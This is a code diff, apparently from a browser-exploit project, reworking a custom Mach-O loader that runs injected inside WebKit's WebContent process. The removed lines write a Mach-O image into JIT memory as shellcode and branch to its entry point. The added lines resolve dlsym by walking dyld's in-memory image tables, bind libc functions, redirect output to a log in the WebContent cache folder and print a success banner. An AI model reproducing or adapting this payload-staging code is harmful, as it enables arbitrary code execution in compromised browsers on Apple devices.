@@ -2,40 +2,26 @@
 #import <mach-o/dyld.h>
 #import <mach-o/dyld_images.h>
 #import <mach-o/nlist.h>
+#import <mach-o/loader.h>
+#import <mach-o/nlist.h>
+#import <mach-o/dyld.h>
+#import <mach-o/dyld_images.h>
 #import <mach/mach.h>
-#import <sys/mman.h>
 #import <stdio.h>
 #import <dlfcn.h>
+#import <stdlib.h>
+#import <stdbool.h>
+#import <fcntl.h>
 
 void crash(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t);
 
-void* my_memcpy(void *dest, const void *src, size_t n) {
-    unsigned char *d = (unsigned char *)dest;
-    const unsigned char *s = (const unsigned char *)src;
-    while (n--) *d++ = *s++;
-    return dest;
-}
-
-uint64_t findMainEntryPoint(struct mach_header_64* header) {
-    struct load_command* command = (struct load_command*)((uint8_t*)header + 32);
-    for(int i = 0; i < header->ncmds > 0; i++) {
-        if (command->cmd == LC_MAIN) {
-            struct entry_point_command* entryCommand = (struct entry_point_command*)command;
-            return entryCommand->entryoff;
-        }
-        command = (struct load_command *)((void *)command + command->cmdsize);
+int my_strcmp(const char *s1, const char *s2) {
+    while (*s1 && (*s1 == *s2)) {
+        s1++;
+        s2++;
     }
-    return 0;
+    return (unsigned char)*s1 - (unsigned char)*s2;
 }
-
-uint32_t generate_b_instruction(uint32_t offset) {
-    uint32_t imm26 = offset / 4;
-    uint32_t instruction = 0x14000000 | (imm26 & 0x03FFFFFF);
-    return instruction;
-}
-
-// dyld stuff
-typedef void* (*dlsym_func)(void*, char*);
 
 struct arm64_frame {
     struct arm64_frame* previousFrame;
@@ -51,34 +37,6 @@ uint64_t findDyldBase(void) {
     return (uint64_t)magicPtr;
 }
 
-// Check if string is "__all_image_info__DATA" or "__all_image_info__DATA_DIRTY"
-int is__all_image_info__DATA(char* s) {
-    return (s[0] == 95 && s[1] == 95 && s[2] == 97 && s[3] == 108 && s[4] == 108 && s[5] == 95 &&
-            s[6] == 105 && s[7] == 109 && s[8] == 97 && s[9] == 103 && s[10] == 101 && s[11] == 95 &&
-            s[12] == 105 && s[13] == 110 && s[14] == 102 && s[15] == 111 && s[16] == 95 && s[17] == 95 &&
-            s[18] == 68 && s[19] == 65 && s[20] == 84 && s[21] == 65 && s[22] == 0) || (s[0] == 95 && s[1] == 95 && s[2] == 97 && s[3] == 108 && s[4] == 108 && s[5] == 95 && s[6] == 105 && s[7] == 109 && s[8] == 97 && s[9] == 103 && s[10] == 101 && s[11] == 95 && s[12] == 105 && s[13] == 110 && s[14] == 102 && s[15] == 111 && s[16] == 95 && s[17] == 95 && s[18] == 68 && s[19] == 65 && s[20] == 84 && s[21] == 65 && s[22] == 95 && s[23] == 68 && s[24] == 73 && s[25] == 82 && s[26] == 84 && s[27] == 89 && s[28] == 0);
-}
-
-// Check if string is "__TEXT"
-int is__TEXT(char* s) {
-    return s[0] == 95 && s[1] == 95 && s[2] == 84 && s[3] == 69 && s[4] == 88 && s[5] == 84 && s[6] == 0;
-}
-
-// Check if string is "__LINKEDIT"
-int is__LINKEDIT(char* s) {
-    return s[0] == 95 && s[1] == 95 && s[2] == 76 && s[3] == 73 && s[4] == 78 && s[5] == 75 && s[6] == 69 && s[7] == 68 && s[8] == 73 && s[9] == 84 && s[10] == 0;
-}
-
-// Check if string is "/usr/lib/system/libdyld.dylib"
-int is__libdyld(char* s) {
-    return s[0] == 47 && s[1] == 117 && s[2] == 115 && s[3] == 114 && s[4] == 47 && s[5] == 108 && s[6] == 105 && s[7] == 98 && s[8] == 47 && s[9] == 115 && s[10] == 121 && s[11] == 115 && s[12] == 116 && s[13] == 101 && s[14] == 109 && s[15] == 47 && s[16] == 108 && s[17] == 105 && s[18] == 98 && s[19] == 100 && s[20] == 121 && s[21] == 108 && s[22] == 100 && s[23] == 46 && s[24] == 100 && s[25] == 121 && s[26] == 108 && s[27] == 105 && s[28] == 98 && s[29] == 0;
-}
-
-// Check if string is "_dlsym"
-int is_dlsym(char* s) {
-    return s[0] == 95 && s[1] == 100 && s[2] == 108 && s[3] == 115 && s[4] == 121 && s[5] == 109 && s[6] == 0;
-}
-
 struct dyld_all_image_infos* findDyldAllImageInfos(uint64_t dyldBase) {
     struct mach_header_64* header = (struct mach_header_64*)dyldBase;
     struct load_command* command = (struct load_command*)((uint8_t*)header + 32);
@@ -87,11 +45,11 @@ struct dyld_all_image_infos* findDyldAllImageInfos(uint64_t dyldBase) {
         if (command->cmd == LC_SEGMENT_64) {
             struct segment_command_64* segment = (struct segment_command_64*)command;
             struct section_64* section = (struct section_64*)((uint8_t*)segment + sizeof(struct segment_command_64));
-            if (is__TEXT(segment->segname) == 1) {
+            if (my_strcmp(segment->segname, "__TEXT") == 0) {
                 slide = dyldBase - segment->vmaddr;
             }
             for (int j = 0; j < segment->nsects; j++) {
-                if (is__all_image_info__DATA(section->sectname) == 1) {
+                if (my_strcmp(section->sectname, "__all_image_info__DATA") == 0 || my_strcmp(section->sectname, "__all_image_info__DATA_DIRTY") == 0) {
                     return (struct dyld_all_image_infos*)(section->addr + slide);
                 }
                 section = (struct section_64*)((uint8_t*)section + sizeof(struct section_64));
@@ -102,17 +60,17 @@ struct dyld_all_image_infos* findDyldAllImageInfos(uint64_t dyldBase) {
     return NULL;
 }
 
-uint64_t findlibDyldImageAddr(struct dyld_all_image_infos* allImageInfos) {
+uint64_t findDyldImageAddr(struct dyld_all_image_infos* allImageInfos, char* name) {
     for (unsigned int i = 0; i < allImageInfos->infoArrayCount; i++) {
         const struct dyld_image_info* imageInfo = &allImageInfos->infoArray[i];
-        if (is__libdyld((char*)imageInfo->imageFilePath) == 1) {
+        if (my_strcmp(imageInfo->imageFilePath, name) == 0) {
             return (uint64_t)imageInfo->imageLoadAddress;
         }
     }
     return 0;
 }
 
-dlsym_func findDlsymAddr(uint64_t baseAddr) {
+uint64_t findSymbol(uint64_t baseAddr, char* wanted_name) {
     struct mach_header_64* header = (struct mach_header_64*)baseAddr;
     struct load_command* command = (struct load_command*)((uint8_t*)header + 32);
     struct segment_command_64* linkedit = NULL;
@@ -121,9 +79,9 @@ dlsym_func findDlsymAddr(uint64_t baseAddr) {
     for(int i = 0; i < header->ncmds > 0; i++) {
         if (command->cmd == LC_SEGMENT_64) {
             struct segment_command_64* segment = (struct segment_command_64*)command;
-            if (is__TEXT(segment->segname) == 1) {
+            if (my_strcmp(segment->segname, "__TEXT") == 0) {
                 slide = baseAddr - segment->vmaddr;
-            } else if (is__LINKEDIT(segment->segname) == 1) {
+            } else if (my_strcmp(segment->segname, "__LINKEDIT") == 0) {
                 linkedit = (struct segment_command_64*)command;
             }
         } else if (command->cmd == LC_SYMTAB) {
@@ -135,14 +93,56 @@ dlsym_func findDlsymAddr(uint64_t baseAddr) {
     char* sym_str_table = (char*)linkedit->vmaddr - linkedit->fileoff + slide + symtab->stroff;
     struct nlist_64* sym_table = (struct nlist_64*)(linkedit->vmaddr - linkedit->fileoff + slide + symtab->symoff);
     for (int i = 0; i < symtab->nsyms; i++) {
-        if (sym_table[i].n_value && is_dlsym(&sym_str_table[sym_table[i].n_un.n_strx]) == 1) {
-            return (dlsym_func)(sym_table[i].n_value + slide);
+        if (sym_table[i].n_value && my_strcmp(wanted_name, &sym_str_table[sym_table[i].n_un.n_strx]) == 0) {
+            return (uint64_t)(sym_table[i].n_value + slide);
         }
     }
-    return NULL;
+    return 0;
 }
 
-void prepareBindings(uint64_t address, dlsym_func dlsym_ptr) {
+typedef unsigned int (*sleep_func)(unsigned int);
+typedef void* (*malloc_func)(size_t);
+typedef void* (*dlsym_func)(void*, char*);
+typedef int (*strcmp_func)(char*, char*);
+typedef size_t (*strlen_func)(char*);
+typedef int (*open_func)(const char*, int, ...);
+typedef char* (*getenv_func)(const char*);
+typedef void (*abort_func)(void);
+typedef size_t (*write_func)(int, const void*, size_t);
+typedef int (*dup2_func)(int, int);
+typedef void* (*dlopen_func)(const char*, int);
+
+dlsym_func dlsym_ptr;
+open_func open_ptr;
+write_func write_ptr;
+dup2_func dup2_ptr;
+sleep_func sleep_ptr;
+getenv_func getenv_ptr;
+strlen_func strlen_ptr;
+malloc_func malloc_ptr;
+
+char* combineStrings(char* str1, char* str2) {
+    size_t len1 = strlen_ptr(str1);
+    size_t len2 = strlen_ptr(str2);
+    char* combined = malloc_ptr(len1 + len2 + 1);
+    for (int i = 0; i < len1; i++) {
+        combined[i] = str1[i];
+    }
+    for (int i = 0; i < len2; i++) {
+        combined[i + len1] = str2[i];
+    }
+    combined[len1 + len2] = 0;
+    return combined;
+}
+
+void print(char* message) {
+    write_ptr(STDOUT_FILENO, message, strlen_ptr(message));
+    write_ptr(STDOUT_FILENO, "\n", 1);
+}
+
+#define ret (uint64_t)open_ptr
+
+void prepareBindings(uint64_t address) {
     struct mach_header_64* header = (void*)address;
     struct load_command* command = (struct load_command*)((uint8_t*)header + 32);
     struct symtab_command* symtab = NULL;
@@ -169,33 +169,74 @@ void prepareBindings(uint64_t address, dlsym_func dlsym_ptr) {
         char* name = (char*)(address + symtab->stroff + sym_table[i].n_un.n_strx);
         uint64_t addr = (uint64_t)dlsym_ptr(RTLD_DEFAULT, name + 1);
         if (addr == 0) continue;
+        print(name);
         bindings[index] = addr;
         index++;
     }
 }
 
-int c_start(uint64_t JITAddress, uint64_t shellcodeAddress, void* machoBytes, size_t execSize) {
-    // Find dlsym
+void printHex(uint64_t value) {
+    char hexStr[17];
+    int i;
+    for (i = 15; i >= 0; i--) {
+        hexStr[i] = "0123456789ABCDEF"[value & 0xF];
+        value >>= 4;
+    }
+    hexStr[16] = '\0';
+    print(hexStr);
+}
+
+int main(void) {
+    // Init symbols
     uint64_t dyldBase = findDyldBase();
     struct dyld_all_image_infos* allImageInfos = findDyldAllImageInfos(dyldBase);
-    uint64_t libdyldBase = findlibDyldImageAddr(allImageInfos);
-    dlsym_func dlsym_ptr = findDlsymAddr(libdyldBase);
+    uint64_t libdyldBase = findDyldImageAddr(allImageInfos, "/usr/lib/system/libdyld.dylib");
+    uint64_t dlsymAddr = findSymbol(libdyldBase, "_dlsym");
+    dlsym_ptr = (void*)dlsymAddr;
+    open_ptr = dlsym_ptr(RTLD_DEFAULT, "open");
+    write_ptr = dlsym_ptr(RTLD_DEFAULT, "write");
+    dup2_ptr = dlsym_ptr(RTLD_DEFAULT, "dup2");
+    sleep_ptr = dlsym_ptr(RTLD_DEFAULT, "sleep");
+    getenv_ptr = dlsym_ptr(RTLD_DEFAULT, "getenv");
+    strlen_ptr = dlsym_ptr(RTLD_DEFAULT, "strlen");
+    malloc_ptr = dlsym_ptr(RTLD_DEFAULT, "malloc");
+
+    sleep_ptr(5);
+
+    // Init logger
+    char* homePath = getenv_ptr("HOME");
+    char* path = combineStrings(homePath, "/Library/Caches/com.apple.WebKit.WebContent/log.txt");
+    int fd = open_ptr(path, O_RDWR | O_CREAT | O_TRUNC, 0644);
+    if (fd == -1) {
+        crash(500,500,500,500,500,500,500,500);
+    }
+    dup2_ptr(fd, STDOUT_FILENO);
+    dup2_ptr(fd, STDERR_FILENO);
     
-    // Bind our Mach-O to the external symbols via dlsym
-    prepareBindings((uint64_t)machoBytes, dlsym_ptr);
+    print("Running via custom Mach-O loader");
+    print("WE ARE WEBCONTENT!!");
+    print("Hello, World!");
     
-    // Align our JIT address, this is where we write our Mach-O
-    uint64_t alignedAddress = (JITAddress + 0x4000) & 0xFFFFFFFFFFFFF000;
+    printHex((uint64_t)dup2_ptr);
+    printHex((uint64_t)write_ptr);
+
+    uint32_t* pc;
+    __asm__("adr %0, ." : "=r"(pc));
+    while (*pc != MH_MAGIC && *pc != MH_MAGIC_64) pc--;
+
+    prepareBindings((uint64_t)pc);
+    printHex((uint64_t)printf);
+    printHex((uint64_t)dup2);
+    printHex((uint64_t)write);
     
-    // Find the main entry point of our Mach-O
-    uint64_t entryOff = findMainEntryPoint(machoBytes);
-    uint64_t alignOff = alignedAddress - JITAddress;
+    if ((uint64_t)printf == (uint64_t)dlsym_ptr(RTLD_DEFAULT, "printf")) {
+        print("GOOD!");
+    } else {
+        print("BAD!");
+    }
     
-    // Write our Mach-O to our temporary buffer which gets written to the JIT address
-    my_memcpy((void*)shellcodeAddress + alignOff, machoBytes, execSize);
-    
-    // Generate a branch instruction at the top of our shellcode to branch to the main entry point
-    uint32_t instruction = generate_b_instruction((uint32_t)(alignedAddress - JITAddress) + (uint32_t)entryOff);
-    *(uint32_t*)shellcodeAddress = instruction;
+    write(STDOUT_FILENO, "Hello!!\n", 8);
+    printHex(mach_task_self_);
+    sleep(60);
     return 0;
 }
